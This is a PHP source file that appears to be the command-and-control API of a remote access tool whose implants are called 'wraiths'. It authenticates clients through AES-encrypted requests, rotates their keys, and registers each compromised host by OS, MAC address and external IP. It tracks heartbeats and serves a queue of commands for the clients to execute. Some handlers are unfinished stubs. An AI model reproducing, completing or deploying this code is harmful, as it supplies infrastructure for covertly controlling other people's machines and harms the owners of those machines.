<?php
// The API page is entirely PHP and returns JSON replies. It is used by both the panel and the
// wraith clients. At every request, each must identify themselves before they may continue. Wraiths
// have an access code defined on login

// Include some required functions
require_once("assets/functions.php");

// It's important that the amount of displayed wraiths on the panel is valid so expire old wraiths before anything else
expire_wraiths();

// Create crypt class
$aes = new AesEncryption();

// Define a response to the requester
$response = [];

// Define a function to respond to the client
function respond($crypt=true) {
	// Use global AES object for encryption
	global $aes;
	// Use global response object to respond to client
	global $response;
	// Use global encryption key
	global $crypt_key;

	// Give a single response and exit
	if ($crypt) {
		$message = $aes->encrypt(json_encode($response), $crypt_key);
	} else {
		$message = json_encode($response);
	}
	die($message);
}

// Get the request body
$req_body = file_get_contents("php://input");

// Set original request body as one of values to return. For debugging only.
//$response["orig_request_body"] = $req_body;

// Find if the request is valid
// First 5 characters are random so ignore them, get chars after
if (!(substr($req_body, 5, 4) === "Wr7H")) {
	$response["status"] = "ERROR";
	$response["message"] = "Incorrectly formatted request";
	respond(false);
}
// Try to decrypt the text with either the wraith key or the panel key. They will always
// be different as they are different lengths.
$wraith_decrypted_message = $aes->decrypt(substr($req_body, 9), get_db()["wraith_crypt_key"]); // Default wraith key
$wraith_switch_decrypted_message = $aes->decrypt(substr($req_body, 9), get_db()["settings"]["wraith_switch_key"]); // The new wraith key (switch)
$panel_decrypted_message = $aes->decrypt(substr($req_body, 9), get_db()["current_panel_crypt_key"]); // The panel key

// If the client is a wraith
if (!($wraith_decrypted_message === null)) {
	$response["requester_type"] = "wraith";
	// Define the crypt_key as the wraith key to make sure we can communicate
	$crypt_key = get_db()["wraith_crypt_key"];
	// JSON decode the message and assign to request variable
	// for ease of access.
	$request = json_decode($wraith_decrypted_message, true);
	// Ensure the client's request is valid JSON
	if ($request === null) {
		$response["status"] = "ERROR";
		$response["message"] = "Invalid request second layer formatting";
		respond();
	}
// If the client is a wraith but using the switch key
} elseif (!($wraith_switch_decrypted_message === null)) {
	$response["requester_type"] = "wraith";
	// Define the crypt_key as the switch key to make sure we can communicate
	$crypt_key = get_db()["settings"]["wraith_switch_key"];
	// JSON decode the message and assign to request variable
	// for ease of access.
	$request = json_decode($wraith_switch_decrypted_message, true);
	// Ensure the client's request is valid JSON
	if ($request === null) {
		$response["status"] = "ERROR";
		$response["message"] = "Invalid request second layer formatting";
		respond();
	}
// If the client is the panel
} elseif (!($panel_decrypted_message === null)) {
	$response["requester_type"] = "panel";
	// Define the crypt_key as the panel key to make sure we can communicate
	$crypt_key = get_db()["current_panel_crypt_key"];
	// JSON decode the message and assign to request variable
	// for ease of access.
	$request = json_decode($panel_decrypted_message, true);
	// Ensure the client's request is valid JSON
	if ($request === null) {
		$response["status"] = "ERROR";
		$response["message"] = "Invalid request second layer formatting";
		respond();
	}
// If the client was not identified
} else {
	$response["status"] = "ERROR";
	$response["requester_type"] = "unknown";
	$response["message"] = "Request could not be identified as panel or client";
	respond(false);
}

// If we're dealing with a wraith and it's still using the initial key,
// and a switch key is defined, tell it to switch keys.
if (!($wraith_decrypted_message === null) && !(get_db()["settings"]["wraith_switch_key"] === null)) {
	$response["switch_key"] = get_db()["settings"]["wraith_switch_key"];
}

// Let's make sure the wraith or panel headers are valid
if ($response["requester_type"] === "wraith") {
	// Check existence of all required keys
	if (!(haskeys($request, ["message_type","data"]))) {
		$response["status"] = "ERROR";
		$response["message"] = "Missing required client headers";
		respond(false);
	}
} elseif ($response["requester_type"] === "panel") {
	if (!(haskeys($request, ["message_type","panel_token"]))) {
		$response["status"] = "ERROR";
		$response["message"] = "Missing required panel headers";
		respond(false);
	} elseif ($request["panel_token"] != get_db()["current_panel_login_token"]) {
		$response["status"] = "ERROR";
		$response["message"] = "Panel login token is invalid. No API calls can be made using this token";
		respond(false);
	}
}

// From now on, all responses must be encrypted as we know the client
// is capable of encrypted communication.

// As we know that the request came from a legitimate source, let's
// include a server ID header to let the requester know that it can
// communicate with and trust us;
$response["server_id"] = get_db()["server_id"];

// Only do this if we're talking to a wraith
if ($response["requester_type"] === "wraith") {
	// Let's decide what type of request this is
	$req_type = $request["message_type"];
	if ($req_type === "login") {
		// If the wraith requests a login

		// Make sure the data is the right format
		if (!(is_array($request["data"]))) {
			$response["status"] = "ERROR";
			$response["message"] = "Incorrect data format";
			respond();
		}

		// Check if the data has everything we need
		if (!(haskeys($request["data"], ["osname", "ostype", "macaddr"]))) {
			$response["status"] = "ERROR";
			$response["message"] = "Missing required client headers in data";
			respond();
		}

		// Create a UUID for the wraith to identify
		$login_wraith_uuid = gen_uuid();
		// Create a database entry for the wraith
		// Populate with data from the wraith's request
		$newwraith["osname"] = $request["data"]["osname"];
		$newwraith["ostype"] = $request["data"]["ostype"];
		$newwraith["macaddr"] = $request["data"]["macaddr"];
		// Assign blank fields
		$newwraith["extra_info"] = [];
		$newwraith["command_queue"] = [];
		// Command queue will be a named array with the
		// following fields.
		// command_id => UUID of the command
		// command_name => Name of the command
		// args => List of arguments the command has
		// issue_time => The timestamp of when command issued
		// read_time => The timestamp when command was fetched
		// complete_status => Whether the command was completed
		// result => The output of the command

		// Populate with server-acquired variables
		$newwraith["extip"] = get_client_ip();
		$newwraith["logintime"] = time();
		$newwraith["lastheartbeat"] = time();
		// Write database entry
		wraithdb($login_wraith_uuid, $newwraith);
		// Notify wraith of successful connection
		$response["status"] = "SUCCESS";
		$response["message"] = "Successfully logged in";
		$response["wraith_id"] = $login_wraith_uuid;
		respond();

	} elseif ($req_type === "heartbeat") {
		// If the wraith creates a heartbeat (this sends an info update and/or requests new commands.)
		if (!(haskeys($request["data"], ["info", "wraith_id"]))) {
			$response["status"] = "ERROR";
			$response["message"] = "Missing required client headers in data";
			respond();
		}
		// If all headers are present, get wraith ID and process the heartbeat
		$wraith_id = $request["data"]["wraith_id"];
		// If the ID is not present in database, notify
		if (!(wraithdb($wraith_id, null, "checkexist"))) {
			$response["status"] = "ERROR";
			$response["message"] = "Wraith ID invalid";
			respond();
		}
		$wraith_db_entry = wraithdb($wraith_id, null, "get");
		$wraith_db_entry["extra_info"] = $request["data"]["info"];
		// Respond with the commands that are not completed
		$unseen_commands = [];
		foreach ($wraith_db_entry["command_queue"] as $command) {
			if ($command["complete_status"] === "unseen") {
				$unseen_commands[] = $command;
			}
		}
		// Add the commands to the response
		$response["command_queue"] = $unseen_commands;
		// Mark request as success
		$response["status"] = "SUCCESS";
		// Record the heartbeat
		wraith_heartbeat($wraith_id);
		// Respond to request
		respond();
		
	} elseif ($req_type === "putresults") {
		// If the wraith sends results from executing a command
		
		// First, make sure it is logged in
		if (!(haskeys($request["data"], ["wraith_id"]))) {
			$response["status"] = "ERROR";
			$response["message"] = "Missing required client headers in data";
			respond();
		}
		// If all headers are present, get wraith ID
		$wraith_id = $request["data"]["wraith_id"];
		// If the ID is not present in database, notify
		if (!(wraithdb($wraith_id, null, "checkexist"))) {
			$response["status"] = "ERROR";
			$response["message"] = "Wraith ID invalid";
			respond();
		}
		
	} elseif ($req_type === "datastream") {
		// If the wraith opens a data stream
		
	}  else {
		$response["status"] = "ERROR";
		$response["message"] = "A non-existent command was supplied to the API";
		respond();
	}

// Only do this if we're talking to the panel
} elseif ($response["requester_type"] === "panel") {
	$req_type = $request["message_type"];
	if ($req_type === "getinfo") {
		$response["status"] = "SUCCESS";
		$response["data"] = json_encode(['test' => 'testing', 'test2' => 'testing', 'test3' => 'testing']);
		respond();

	} elseif ($req_type === "getwraiths") {
		// Get a list of all wraiths and their attributes
		respond();
		
	} elseif ($req_type === "sendcommand") {
		// Send a command to a/multiple wraith/s
		respond();
		
	} elseif ($req_type === "settings") {
		// View/modify settings
		respond();
		
	} else {
		$response["status"] = "ERROR";
		$response["message"] = "A non-existent command was supplied to the API";
		respond();
	}
}

// Finally, if nothing else was sent before, send an encrypted response to the requester indicating success.
$response["status"] = "SUCCESS";
respond();
?>
